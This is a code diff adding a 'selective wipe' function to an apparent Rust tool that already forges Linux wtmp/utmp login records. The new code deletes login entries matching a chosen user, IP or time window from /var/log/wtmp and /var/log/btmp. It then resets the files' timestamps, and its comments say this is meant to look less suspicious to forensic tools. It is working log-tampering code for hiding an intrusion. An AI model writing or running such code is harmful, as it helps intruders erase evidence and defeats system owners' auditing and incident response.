@@ -1,7 +1,7 @@
 // Binary injection into /var/log/wtmp and /var/run/utmp (struct utmp, 384 bytes each record).
 
-use std::fs::OpenOptions;
-use std::io::Write;
+use std::fs::{self, OpenOptions};
+use std::io::{Read, Write};
 use std::path::Path;
 
 // struct utmp layout (x86-64 Linux / glibc) — verified 384 bytes
@@ -178,5 +178,150 @@ pub fn forge_wtmp(opts: &WtmpForgeOpts) -> WtmpForgeStats {
         }
     }
 
+    s
+}
+
+// ── Selective wipe ────────────────────────────────────────────────────────────
+//
+// Remove specific records from wtmp/btmp without touching others.
+// Criteria (all optional, ANDed): exact username, exact IP/host, time range.
+// Unlike truncate-all, this leaves legitimate sessions intact — far less
+// suspicious to forensic tools that expect some history in these files.
+
+pub struct WtmpWipeFilter {
+    pub username: Option<String>,  // match ut_user field exactly
+    pub host_ip:  Option<String>,  // match ut_host field exactly
+    pub ts_from:  Option<i64>,     // remove records with tv_sec >= ts_from
+    pub ts_to:    Option<i64>,     // remove records with tv_sec <= ts_to
+    pub verbose:  bool,
+}
+
+#[derive(Default)]
+pub struct WtmpWipeStats {
+    pub records_kept:    u32,
+    pub records_removed: u32,
+    pub files_touched:   u32,
+    pub errors:          u32,
+}
+
+fn record_matches(rec: &[u8; UTMP_SIZE], f: &WtmpWipeFilter) -> bool {
+    if let Some(ref u) = f.username {
+        let user_bytes = &rec[OFF_USER..OFF_USER + UT_NAMESIZE];
+        let end = user_bytes.iter().position(|&b| b == 0).unwrap_or(UT_NAMESIZE);
+        if std::str::from_utf8(&user_bytes[..end]).unwrap_or("") != u.as_str() {
+            return false;
+        }
+    }
+    if let Some(ref h) = f.host_ip {
+        let host_bytes = &rec[OFF_HOST..OFF_HOST + UT_HOSTSIZE];
+        let end = host_bytes.iter().position(|&b| b == 0).unwrap_or(UT_HOSTSIZE);
+        if std::str::from_utf8(&host_bytes[..end]).unwrap_or("") != h.as_str() {
+            return false;
+        }
+    }
+    let ts = i32::from_le_bytes([rec[OFF_TV_SEC], rec[OFF_TV_SEC+1], rec[OFF_TV_SEC+2], rec[OFF_TV_SEC+3]]) as i64;
+    if let Some(from) = f.ts_from { if ts < from { return false; } }
+    if let Some(to)   = f.ts_to   { if ts > to   { return false; } }
+    true
+}
+
+fn wipe_wtmp_path(path: &str, filter: &WtmpWipeFilter, s: &mut WtmpWipeStats) {
+    use std::ffi::CString;
+
+    let p = Path::new(path);
+    if !p.exists() { return; }
+
+    // Save timestamps before any write
+    let saved_ts: Option<(i64, i64)> = fs::metadata(p).ok().map(|m| {
+        use std::os::unix::fs::MetadataExt;
+        (m.atime(), m.mtime())
+    });
+
+    // Read entire file
+    let mut raw = Vec::new();
+    {
+        let mut f = match OpenOptions::new().read(true).open(p) {
+            Ok(f)  => f,
+            Err(e) => { s.errors += 1;
+                        if filter.verbose { eprintln!("[!] wtmp-wipe: read {}: {}", path, e); }
+                        return; }
+        };
+        if f.read_to_end(&mut raw).is_err() { s.errors += 1; return; }
+    }
+
+    if raw.len() % UTMP_SIZE != 0 {
+        if filter.verbose { eprintln!("[!] wtmp-wipe: {}: size {} not a multiple of {}", path, raw.len(), UTMP_SIZE); }
+    }
+
+    let n_records = raw.len() / UTMP_SIZE;
+    let mut kept: Vec<u8> = Vec::with_capacity(raw.len());
+
+    for i in 0..n_records {
+        let start = i * UTMP_SIZE;
+        let end   = start + UTMP_SIZE;
+        if end > raw.len() { break; }
+        let mut rec = [0u8; UTMP_SIZE];
+        rec.copy_from_slice(&raw[start..end]);
+
+        if record_matches(&rec, filter) {
+            s.records_removed += 1;
+            if filter.verbose {
+                let user_bytes = &rec[OFF_USER..OFF_USER + UT_NAMESIZE];
+                let uend = user_bytes.iter().position(|&b| b == 0).unwrap_or(UT_NAMESIZE);
+                eprintln!("[+] wtmp-wipe: removed record[{}] user={:?}", i,
+                    std::str::from_utf8(&user_bytes[..uend]).unwrap_or("?"));
+            }
+        } else {
+            kept.extend_from_slice(&rec);
+            s.records_kept += 1;
+        }
+    }
+
+    // Rewrite file atomically via tmp → rename
+    let tmp_path = format!("{}.s2tmp", path);
+    match OpenOptions::new().write(true).create(true).truncate(true).open(&tmp_path) {
+        Ok(mut f) => {
+            if f.write_all(&kept).is_err() {
+                s.errors += 1;
+                let _ = fs::remove_file(&tmp_path);
+                return;
+            }
+        }
+        Err(e) => {
+            s.errors += 1;
+            if filter.verbose { eprintln!("[!] wtmp-wipe: write {}: {}", tmp_path, e); }
+            return;
+        }
+    }
+
+    if fs::rename(&tmp_path, path).is_err() {
+        s.errors += 1;
+        let _ = fs::remove_file(&tmp_path);
+        return;
+    }
+
+    s.files_touched += 1;
+
+    // Restore original timestamps
+    if let Some((atime, mtime)) = saved_ts {
+        let times = [
+            libc::timespec { tv_sec: atime, tv_nsec: 0 },
+            libc::timespec { tv_sec: mtime, tv_nsec: 0 },
+        ];
+        if let Ok(c) = CString::new(path.as_bytes()) {
+            unsafe { libc::utimensat(libc::AT_FDCWD, c.as_ptr(), times.as_ptr(), 0); }
+        }
+    }
+
+    if filter.verbose {
+        eprintln!("[+] wtmp-wipe: {} — kept {}, removed {}", path, s.records_kept, s.records_removed);
+    }
+}
+
+pub fn wipe_wtmp_selective(filter: &WtmpWipeFilter) -> WtmpWipeStats {
+    let mut s = WtmpWipeStats::default();
+    for path in &["/var/log/wtmp", "/var/log/btmp"] {
+        wipe_wtmp_path(path, filter, &mut s);
+    }
     s
 }
